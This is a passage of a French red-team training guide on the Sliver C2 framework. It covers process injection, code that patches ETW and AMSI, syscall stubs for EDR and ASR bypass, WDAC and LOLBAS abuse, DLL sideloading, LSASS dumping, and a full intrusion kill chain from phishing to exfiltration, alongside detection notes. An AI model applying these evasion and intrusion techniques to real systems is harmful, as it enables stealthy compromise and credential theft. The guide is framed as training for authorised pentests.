    --key /etc/letsencrypt/live/c2.../privkey.pem
```

### Failover beacons

Configurer plusieurs C2 dans un beacon pour que si l'un tombe, l'implant essaie l'autre. Sliver supporte cela via :

```sliver
sliver > generate beacon --http c2-1.example.com,c2-2.example.com,c2-3.example.com ...
```

### High availability

- Multiple team servers
- Réplication des bases via NFS / rsync
- Load balancers en frontal
- DNS geographique (failover automatique)

---

## 21. Windows APIs & Custom Tooling

> Pour aller au-delà des outils built-in, un opérateur senior écrit ses **propres tools** en C/C++/C# pour rester sous le radar.

### Pourquoi développer custom ?

- Outils publics (Rubeus, Mimikatz) ont des **signatures connues**
- AMSI / ETW / EDR détectent les patterns
- Permet d'adapter aux contraintes spécifiques (ASR, WDAC)

### Windows APIs offensives essentielles

|API|Usage|
|---|---|
|`OpenProcess`|Ouvrir un handle vers un process|
|`VirtualAllocEx`|Allouer mémoire dans un autre process|
|`WriteProcessMemory`|Écrire du shellcode|
|`CreateRemoteThread`|Démarrer un thread distant (process injection)|
|`NtCreateThreadEx`|Variante NT (plus discrète)|
|`LoadLibrary`|Charger DLL|
|`GetProcAddress`|Résoudre une fonction|
|`CreateProcess` / `CreateProcessW`|Créer process (avec PPID spoofing)|
|`OpenProcessToken`|Token manipulation|
|`DuplicateTokenEx`|Token impersonation|
|`LogonUser`|Authentification|

### Appel d'API depuis C# (P/Invoke)

```csharp
[DllImport("kernel32.dll")]
public static extern IntPtr OpenProcess(uint access, bool inherit, int pid);

[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr addr,
    uint size, uint type, uint protect);
```

### Appel direct via C++ (mieux pour OpSec)

```cpp
#include <Windows.h>
HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
LPVOID addr = VirtualAllocEx(h, NULL, sizeof(shellcode),
    MEM_COMMIT, PAGE_EXECUTE_READWRITE);
```

### Outil custom → BOF Sliver

Un BOF (Beacon Object File) compile en COFF (Common Object File Format) — plus léger qu'un .NET assembly, exécuté in-process :

1. Écrire en C
2. Compiler avec `mingw-w64` :

```bash
x86_64-w64-mingw32-gcc -c custom.c -o custom.o
```

3. Charger dans Sliver via extension custom

### Compilation de BOFs pour Sliver

Voir : https://github.com/sliverarmory/armory et la doc des extensions : https://github.com/BishopFox/sliver/wiki/Extensions

---

## 22. Process Injection avancée

### Techniques classiques

|Technique|Description|OpSec|
|---|---|---|
|**CreateRemoteThread**|Thread dans process distant|❌ Détecté par tous les EDR|
|**QueueUserAPC**|Queue d'APC|⚠️ Détecté par certains EDR|
|**SetThreadContext**|Hijack thread existant|⚠️ Détecté|
|**Process Hollowing**|Remplacer image PE|⚠️ Très détecté|
|**PPID Spoofing**|Spoof process parent|✅ Bon|
|**Module Stomping**|Charger DLL légit puis overwrite|✅ Bon|
|**Thread Hijacking + Stack Spoofing**|Hijack + masquer call stack|✅✅ Excellent|
|**EarlyBird APC**|APC avant que process démarre|✅ Bon|
|**Process Doppelgänging / Herpaderping**|Abuse Transactional NTFS|✅✅ Excellent|

### Sliver native

```sliver
# CreateRemoteThread (par défaut)
sliver (session) > execute-shellcode -p <pid> shellcode.bin

# DLL Reflective Injection
sliver (session) > spawndll -p explorer.exe inject.dll
```

### PPID Spoofing

Faire passer le process injecté pour un enfant d'un process légitime :

```sliver
sliver (session) > execute-assembly --ppid <pid_explorer.exe> tool.exe
```

⚠️ Sliver supporte le `--ppid` mais pour **command line spoofing** ou techniques plus avancées, il faut développer un loader custom.

### Manual Mapping

Charger une DLL manuellement sans `LoadLibrary` (qui crée un événement ETW). Nécessite custom code en C/C++.

---

## 23. Defence Evasion (PPID Spoofing, Cmdline Spoofing, ETW)

### PPID Spoofing

```sliver
sliver (session) > ps -e explorer
sliver (session) > execute-assembly --ppid 4567 SomeTool.exe
```

Sliver passe le PPID à `CreateProcess` avec `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS`.

### Command Line Spoofing

Le spoofing de la ligne de commande affichée dans les logs (Sysmon Event 1, ProcessCreate) requiert :

1. Lancer le process en `CREATE_SUSPENDED`
2. Patcher la `RTL_USER_PROCESS_PARAMETERS->CommandLine` en mémoire
3. Resume le thread

⚠️ Pas built-in dans Sliver — nécessite un BOF custom ou un loader externe.

### ETW (Event Tracing for Windows) Bypass

ETW est utilisé par les EDR pour récolter les événements user-mode sans hook.

#### ETW Patching

Patcher `EtwEventWrite` en mémoire pour qu'il retourne immédiatement :

```cpp
// Pseudocode
HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
FARPROC pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
DWORD oldProtect;
VirtualProtect(pEtwEventWrite, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
*((unsigned char*)pEtwEventWrite) = 0xC3;  // RET
VirtualProtect(pEtwEventWrite, 1, oldProtect, &oldProtect);
```

Dans Sliver :

```sliver
sliver (session) > execute-assembly --etw-bypass <tool.exe>
```

### AMSI Bypass

AMSI scanne PowerShell/JScript/VBScript avant exécution. Patch `AmsiScanBuffer` :

```sliver
sliver (session) > execute-assembly --amsi-bypass <tool.exe>
```

### Block ETW Logger via ACLs (advanced)

Certaines EDR utilisent des **TraceLoggers** spécifiques (Microsoft-Windows-Threat-Intelligence). Suspendre ces threads (`NtSetInformationProcess`) bloque l'envoi des events.

---

## 24. Attack Surface Reduction (ASR) Bypass

### Qu'est-ce que ASR ?

**Attack Surface Reduction** est un ensemble de **règles GPO** Microsoft Defender qui bloquent des comportements connus :

|Règle ASR|Bloque|
|---|---|
|Block Office child processes|Word/Excel ne peut pas spawn cmd.exe|
|Block credential stealing from LSASS|Empêche dump LSASS|
|Block Win32 API from Office macros|Bypass macros offensives|
|Block executables from email|Mail attachments .exe|
|Block PSExec/WMI process creation|Mouvement latéral classique|
|Block untrusted/unsigned processes from USB|USB drops|
|Block JS/VBS from launching downloaded executables|Phishing classique|

### Énumération des règles

```sliver
sliver (session) > execute -o powershell.exe Get-MpPreference
# Voir AttackSurfaceReductionRules_Ids et AttackSurfaceReductionRules_Actions
```

### Bypass strategies

#### 1. Use legitimate signed binaries (LOLBAS)

- **rundll32.exe** + custom DLL
- **regsvr32.exe** (Squiblydoo)
- **mshta.exe** (HTA payloads)
- **InstallUtil.exe** (.NET assemblies)
- **MSBuild.exe** (XML+C# inline)

#### 2. Code that doesn't trigger ASR rules

- Pas de child process depuis Office
- Pas d'accès LSASS via API classiques (utiliser **silver bullet** : MiniDumpWriteDump via signed binaries)

#### 3. Direct syscalls

Bypass des hooks ASR (qui hook user-mode) :

```cpp
// Au lieu de NtOpenProcess → faire un syscall direct
mov r10, rcx
mov eax, 0x26      // SSN de NtOpenProcess (varie par Windows version)
syscall
ret
```

Outils : [SysWhispers3](https://github.com/klezVirus/SysWhispers3), [Hell's Gate](https://github.com/am0nsec/HellsGate)

#### 4. Disable via local admin

Si tu as déjà admin local :

```powershell
Set-MpPreference -AttackSurfaceReductionRules_Ids <id> -AttackSurfaceReductionRules_Actions Disabled
```

⚠️ Bruyant — déclenche des alertes EDR.

---

## 25. Windows Defender Application Control (WDAC) Bypass

### Qu'est-ce que WDAC ?

**WDAC** (anciennement Device Guard) est une politique Windows qui ne laisse exécuter que des binaires **signés** ou listés dans une whitelist.

### Énumération

```sliver
sliver (session) > execute -o powershell.exe Get-CimInstance -ClassName Win32_DeviceGuard
sliver (session) > execute -o cmd.exe /c "auditpol /get /category:*"
```

### Bypass strategies

#### 1. LOLBAS (Living Off The Land Binaries And Scripts)

Référence : https://lolbas-project.github.io/

Binaires Microsoft **signés** abusables :

- **CertUtil** : decode base64, download
- **MSBuild** : exécute XML/C# inline
- **InstallUtil** : exécute .NET assemblies
- **mshta** : exécute HTA
- **regsvr32** : Squiblydoo (DLL via JScript)
- **AppInstaller** : abuse ms-appinstaller protocol

Exemple MSBuild bypass :

```xml
<Project ToolsVersion="14.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Hello"><PayloadClass /></Target>
  <UsingTask TaskName="PayloadClass" TaskFactory="CodeTaskFactory" ...>
    <Task><Code Type="Class" Language="cs">
      // C# code here (loads shellcode, etc.)
    </Code></Task>
  </UsingTask>
</Project>
```

#### 2. DLL Sideloading

Abuse une application signée qui charge une DLL malveillante depuis le même dossier :

- OneDriveStandaloneUpdater.exe → version.dll
- Teams.exe → particular DLLs
- Référence : https://hijacklibs.net/

```sliver
sliver (session) > generate --http ... --format shared -N version.dll
sliver (session) > upload version.dll C:\\Users\\victim\\AppData\\Local\\Vulnerable\\
```

#### 3. Signed Binary Proxy Execution

- Charge ton DLL via `rundll32.exe legitimate.dll,Function`
- Si `legitimate.dll` est sous-traitant ton code via export hijacking

#### 4. Trusted Vulnerable Drivers (BYOVD)

Charger un driver **signé légitimement** mais vulnérable (RTCore64.sys, mhyprot2.sys) pour bypasser depuis le kernel. ⚠️ Très bruyant et déclenche EDR sophistiqués.

---

## 26. EDR Evasion (Userland Hooking, Syscalls, Kernel Callbacks)

### Comment fonctionne un EDR moderne ?

1. **Userland hooking** : DLL injectée dans chaque process pour intercepter les API critiques (NtCreateProcess, NtReadVirtualMemory…)
2. **Kernel callbacks** : drivers EDR récoltent les events kernel (PsSetCreateProcessNotifyRoutine, ObRegisterCallbacks)
3. **ETW Threat Intelligence** : provider ETW Microsoft-Windows-Threat-Intelligence
4. **Cloud telemetry** : agrégation et corrélation côté cloud (Microsoft 365 Defender, CrowdStrike Falcon…)

### Bypass userland hooks

#### 1. Direct Syscalls

Au lieu d'appeler `kernel32!CreateProcessW` (hooked), faire le syscall directement :

```asm
mov r10, rcx
mov eax, [SSN]
syscall
ret
```

Outils :

- **SysWhispers2/3** (génère des stubs syscall en C#)
- **Hell's Gate / Halo's Gate** (résolution dynamique du SSN)
- **Tartarus' Gate** (fallback si EDR détecte les syscalls)

#### 2. Indirect Syscalls

Le syscall est fait depuis ntdll.dll lui-même (donc le `RIP` de retour pointe dans ntdll, pas dans ton shellcode) :

```asm
mov r10, rcx
mov eax, [SSN]
jmp qword ptr [syscall_address_in_ntdll]
```

#### 3. Unhooking (réécrire ntdll.dll en mémoire)

Charger une copie fraîche de ntdll.dll depuis le disque ou KnownDlls et **patcher** la version hookée en mémoire :

```cpp
HANDLE hFile = CreateFileW(L"C:\\Windows\\System32\\ntdll.dll", ...);
HANDLE hMap = CreateFileMappingW(hFile, ...);
LPVOID pMap = MapViewOfFile(hMap, ...);
// Compare et patch les fonctions hookées
```

#### 4. Hardware Breakpoints (advanced)

Utiliser les debug registers (DR0-DR3) pour bypass les hooks user-mode.

### Bypass kernel callbacks

⚠️ Nécessite généralement **kernel-level access** (BYOVD).

- Patch les structures EDR via driver vulnérable
- Désinscrire les callbacks (`ObUnRegisterCallbacks`, `PsSetCreateProcessNotifyRoutine` avec NULL)
- Outils : [EDRSandblast](https://github.com/wavestone-cdt/EDRSandblast), [EDRPrison](https://github.com/RaphaelMussa/EDRPrison)

### Sliver et l'évasion EDR

Sliver out-of-the-box n'est **PAS** EDR-evasive. Pour des engagements contre des cibles avec EDR moderne :

1. **Utiliser un loader custom** qui :
    - Charge le shellcode Sliver via syscalls directs
    - Patch AMSI/ETW
    - Unhook ntdll
    - Spoofs PPID + cmdline
2. **Recompiler Sliver from source** avec :
    - Strings randomisées
    - Garble pour obfuscation Go
    - Fonctions critiques modifiées

---

## 27. Sleep Mask & In-Memory Obfuscation

### Pourquoi ?

Quand un beacon **dort** (entre check-ins), ses **strings** et **shellcode** restent en mémoire (RWX), détectables par memory scanners (Yara rules sur des process actifs).

### Sleep Mask Kit (concept Cobalt Strike, transposable)

Pendant le sleep :

1. **Encrypt** la heap/.text du beacon (XOR ou AES)
2. **Re-protect** la mémoire en RW (pas RX) pour cacher du shellcode
3. Sleep
4. **Decrypt** + remettre en RX au réveil

### En Sliver

Sliver n'a pas de Sleep Mask Kit officiel out-of-the-box (à date début 2026). Approches :

- Compiler avec **Garble** pour obfusquer les strings Go
- Custom loader qui chiffre le beacon avant chaque sleep et déchiffre au check-in
- Voir : [Ekko](https://github.com/Cracked5pider/Ekko) (sleep obfuscation technique)

### Memory scanning detection

Tools utilisés par les EDR :

- **PE-sieve**
- **Moneta**
- **Hollow's Hunter**

Tester son loader contre ces outils en local avant un engagement.

---

# PARTIE V — DETECTION & RÉFÉRENCE

## 28. OpSec Checklist (Hacksmarter style)

### Avant de lancer un beacon

- [ ] Profil HTTP customisé (User-Agent, paths, headers réalistes)
- [ ] Cert TLS valide (Let's Encrypt sur domaine "innocent")
- [ ] Redirector entre l'opérateur et le serveur Sliver
- [ ] Beacon avec jitter ≥ 30%
- [ ] Restrictions `--limit-domainjoined` / `--limit-username`
- [ ] Implant testé contre Defender + AntiScan.me (jamais VirusTotal)
- [ ] Recompiler Sliver from source si engagement sensible

### Pendant l'opération

- [ ] Préférer **BOFs** plutôt que execute-assembly classique
- [ ] Préférer **inline-execute-assembly** plutôt que execute-assembly default
- [ ] **Jamais** de `shell` interactif
- [ ] **Jamais** de `download` de gros volumes (chunker)
- [ ] **Pas** de `migrate` vers process système (lsass.exe, services.exe)
- [ ] PPID spoofing systématique
- [ ] AMSI/ETW bypass avant tout assembly .NET
- [ ] Cleanup après chaque action (rm tmp files)

### Post-mortem

- [ ] `rev2self` après impersonation
- [ ] Cleanup tickets Kerberos (`klist purge`)
- [ ] Cleanup persistance (sauf si demandé en scope)
- [ ] Rapport documenté (chemin d'attaque, mitigations)
- [ ] Logs Sliver archivés pour le rapport

---

## 29. Détection (Blue Team perspective)

> Connaître les détections aide à mieux évader.

### Signatures Yara publiques

- [Florian Roth's signatures](https://github.com/Neo23x0/signature-base)
- Elastic Sliver implant rules
- BishopFox detection guidelines (inclus dans le repo officiel)

### Règles Sigma communes

- **Suspicious psexec service creation** — détecte `--custom-exe` avec service unique
- **Sliver implant strings** — `github.com/bishopfox/sliver/`
- **Random binary name** — regex `[a-zA-Z0-9]{10}\.exe`
- **WireGuard process unusual location**
- **Named pipe creation matching pattern**

### Detection in network

- **TLS JA3 fingerprints** Go default
- **Beacon regularity** sans jitter
- **HTTP requests** avec paths Sliver par défaut (`/admin/`, `/css/`, etc.)
- **DNS queries** avec patterns base32 long

### Protections Windows

- **AMSI** : scanne PowerShell/JScript/VBScript en mémoire avant exécution
- **ETW** : Event Tracing for Windows
- **Defender ATP** behavioural heuristics
- **AppLocker / WDAC** : block exec non signée
- **CIG (Code Integrity Guard)** : block DLL non signées
- **CFG (Control Flow Guard)** : protection contre ROP

### Bypasses courants intégrés à Sliver

- AMSI patch en mémoire (`AmsiScanBuffer`)
- ETW patch (`EtwEventWrite`)
- API unhooking (manual DLL refresh)

---

## 30. Capstone Project — Workflow complet

### Scenario

Engagement red team sur entreprise avec 2 forêts AD (`parent.local` + `child.local`), EDR moderne (Defender ATP + Sentinel), ASR rules actives, WDAC sur certains hosts.

```
┌──────────────────────────────────────────────────────────────────────┐
│ PHASE 1 — INFRASTRUCTURE                                              │
│   ├─ Setup Sliver server (VPS dédié, hidden)                          │
│   ├─ 2 redirectors Apache + Let's Encrypt sur domaines innocents      │
│   ├─ HTTPS profile customisé (UA: Office365 Sync, paths réalistes)    │
│   ├─ Multiplayer activé, opérateurs invités                           │
│   └─ Failover : 2 listeners (HTTPS principal + DNS fallback)          │
│                                                                       │
│ PHASE 2 — INITIAL ACCESS                                              │
│   ├─ Phishing avec stager Donut (HTA via mshta — bypass ASR)          │
│   ├─ Loader custom (C++ avec syscalls directs)                        │
│   │   ├─ Patch AMSI                                                   │
│   │   ├─ Patch ETW                                                    │
│   │   ├─ Unhook ntdll                                                 │
│   │   └─ Inject shellcode Sliver                                      │
│   └─ Beacon HTTPS check-in toutes 60s ± 30s                           │
│                                                                       │
│ PHASE 3 — SITUATIONAL AWARENESS (in-process / BOFs)                   │
│   ├─ inline-execute-assembly Seatbelt                                 │
│   ├─ c2tc-domaininfo                                                  │
│   ├─ nanodump (pas procdump → bruyant)                                │
│   └─ SharpUp -- audit                                                 │
│                                                                       │
│ PHASE 4 — PRIVESC LOCAL                                               │
│   ├─ Identifier SeImpersonate                                         │
│   ├─ GodPotato via execute-shellcode (pas execute-assembly)           │
│   └─ Spawn beacon SYSTEM avec PPID spoofing (parent: explorer.exe)    │
│                                                                       │
│ PHASE 5 — CRED HARVEST                                                │
│   ├─ nanodump LSASS (BOF, OpSec)                                      │
│   ├─ Offline pypykatz                                                 │
│   ├─ SharpDPAPI triage                                                │
│   └─ Reg query SAM via inline-execute-assembly                        │
│                                                                       │
│ PHASE 6 — AD RECON                                                    │
│   ├─ SharpHound -c DCOnly (stealth, pas Sessions)                     │
│   ├─ SharpView pour requêtes ciblées                                  │
│   └─ Certify -- find /vulnerable                                      │
│                                                                       │
│ PHASE 7 — LATERAL MOVEMENT                                            │
│   ├─ Pivot listener named-pipe sur 1ère machine                       │
│   ├─ make-token + psexec custom service vers SRV01                    │
│   ├─ Beacon SRV01 (via pivot, communications ne sortent pas)          │
│   └─ Réplique pour SRV02, SRV03                                       │
│                                                                       │
│ PHASE 8 — CROSS-FOREST                                                │
│   ├─ Énumération trusts (Get-DomainTrust, Get-ForestTrust)            │
│   ├─ Identifier SID History abuse path                                │
│   ├─ Kerberoast comptes intéressants                                  │
│   ├─ Crack offline (Hashcat)                                          │
│   └─ Golden ticket inter-forest avec /sids:                           │
│                                                                       │
│ PHASE 9 — DOMAIN ADMIN                                                │
│   ├─ ADCS ESC1 sur child.local                                        │
│   ├─ Certify request → Rubeus asktgt → DA child                       │
│   ├─ DCSync krbtgt child                                              │
│   ├─ Coercion (PetitPotam) DC parent                                  │
│   └─ NTLM relay vers ADCS parent → DA parent.local                    │
│                                                                       │
│ PHASE 10 — PERSISTENCE & EXFIL                                        │
│   ├─ SharPersist sur 3 hosts différents (reg, schtask, WMI)           │
│   ├─ Backup beacon DNS (au cas où HTTPS bloqué)                       │
│   ├─ Exfiltration data sensible chunked sur HTTPS                     │
│   └─ Loot store + download                                            │
│                                                                       │
│ PHASE 11 — CLEANUP & REPORT                                           │
│   ├─ rev2self / klist purge sur tous les beacons                      │
│   ├─ Remove SharPersist (sauf si goal = persistance)                  │
│   ├─ Kill beacons proprement                                          │
│   └─ Rapport : kill chain mappé MITRE ATT&CK + remédiations           │
└──────────────────────────────────────────────────────────────────────┘
```

---

## 31. Ressources

### Documentation officielle

- **GitHub Sliver** : https://github.com/BishopFox/sliver
- **Wiki Sliver** : https://github.com/BishopFox/sliver/wiki
- **BishopFox Blog** : https://bishopfox.com/blog
- **Sliver Releases** : https://github.com/BishopFox/sliver/releases
- **Sliver Armory** : https://github.com/sliverarmory/armory

### Articles & tutoriels Sliver

- **Module HTB Academy** : "Intro to C2 Operations with Sliver" (139 pages — celui que tu as)
- **Sliver C2 for Red Team Operations** (Medium / lord_murak) : https://medium.com/@lord_murak/sliver-c2-for-red-team-operations-153135648218
- **Hack The Box Active Directory Pentester Path** (utilise Sliver)
- **Tyler Ramsbey YouTube** (vidéos gratuites Sliver)

### Outils complémentaires

- **Donut** : https://github.com/TheWover/donut
- **SharpCollection** : https://github.com/Flangvik/SharpCollection
- **Impacket** : https://github.com/fortra/impacket
- **Chisel** : https://github.com/jpillora/chisel
- **BOF.NET** : https://github.com/CCob/BOF.NET
- **TrustedSec BOFs** : https://github.com/trustedsec/CS-Situational-Awareness-BOF
- **Nanodump** : https://github.com/fortra/nanodump
- **SysWhispers3** : https://github.com/klezVirus/SysWhispers3
- **EDRSandblast** : https://github.com/wavestone-cdt/EDRSandblast
- **Ekko (sleep obfuscation)** : https://github.com/Cracked5pider/Ekko

### Formations payantes pertinentes (par ordre de pertinence)

1. **Sektor7 — RED TEAM Operator: Malware Development Essentials** (~200 €) — INCONTOURNABLE
2. **Maldev Academy** (~300 €) — référence malware dev moderne
3. **Zero-Point Security CRTO** (~400 €) — Cobalt Strike (transposable Sliver)
4. **Zero-Point Security CRTO II / CRTL** (~425 £) — évasion avancée
5. **Altered Security CRTP / CRTE / CESP**
6. **Sektor7 — Evasion Course** (~200 €)
7. **MalDev Academy Advanced** (~300 €)

### Communautés

- **BloodHoundGang Slack** (canal #sliver)
- **Red Siege Discord**
- **Reddit** : r/redteamsec
- **BishopFox Discord** (officiel Sliver)

### Pour pratiquer

- **HTB labs** : Dante, RastaLabs, Zephyr, Cybernetics
- **CyberDefenders** : labs blue team (pour comprendre la détection)
- **Lab personnel** : Windows Server + AD + Defender ATP via E5 trial Microsoft

---

## Quick reference — Top 30 commandes à connaître par cœur

```sliver
# Setup
multiplayer
new-operator -n <name> -l <ip>
operators

# Listeners
http -L <ip> -l <port>
https -L <ip> -l 443 --cert <fullchain.pem> --key <privkey.pem>
mtls --lhost <ip> --lport 8888
dns --domains example.com.
jobs

# Generation
generate beacon --http <ip>:<port> --skip-symbols -N <name> --os windows
generate --format service ...
profiles new --http <ip>:<port> --format shellcode <name>
implants

# Sessions / Beacons
sessions / beacons
use <id>
info
interactive
tasks

# Exploration (préférer BOFs ↓)
ls / pwd / cd / cat / download / upload
ps / netstat / ifconfig
screenshot

# Execution (par ordre OpSec ↑)
inline-execute-assembly <bin.exe>           # ✅✅ BOF
execute-assembly --in-process <bin.exe>     # ✅
execute-assembly <bin.exe>                  # ⚠️
execute -o cmd <args>                       # ⚠️
shell                                       # ❌

# Post-exploit
nanodump <pid> <out> 1 PMDM                 # OpSec LSASS
hashdump
make-token / impersonate / rev2self / getsystem
migrate <pid>

# Movement
psexec --custom-exe <bin> --service-name <svc> --hostname <target>
pivots tcp --bind 0.0.0.0:<port>
pivots named-pipe --bind <name>

# Tunneling
socks5 start -P 1080
rportfwd add -b <local_port> -r <remote>:<port>
chisel client <ip>:<port> R:socks

# Armory
armory install all

# Cleanup
sessions -k <id>
jobs -K
```

---

> 📌 **Conseil final** : ce document est dense (~30 sections, ~1000 lignes). Découpe-le en cheat sheets thématiques d'1 page maximum dans Obsidian/Notion :
> 
> 1. **Cheat Generation** (commandes generate + profils)
> 2. **Cheat Listeners + Pivoting**
> 3. **Cheat Lateral Movement**
> 4. **Cheat OpSec Decision Tree** (BOF vs assembly vs execute vs shell)
> 5. **Cheat Defence Evasion** (PPID, ETW, AMSI, ASR, WDAC bypass)
> 6. **Cheat Capstone** (workflow rapide)
> 
> Et garde ce document complet comme **référence master** quand tu rencontres un cas non couvert dans tes cheats courtes.

> ⚠️ **Rappel légal** : Sliver est un outil **dual-use**. À n'utiliser que sur des systèmes pour lesquels tu as une autorisation écrite explicite (engagement red team, pentest, lab personnel, CTF, formation HTB).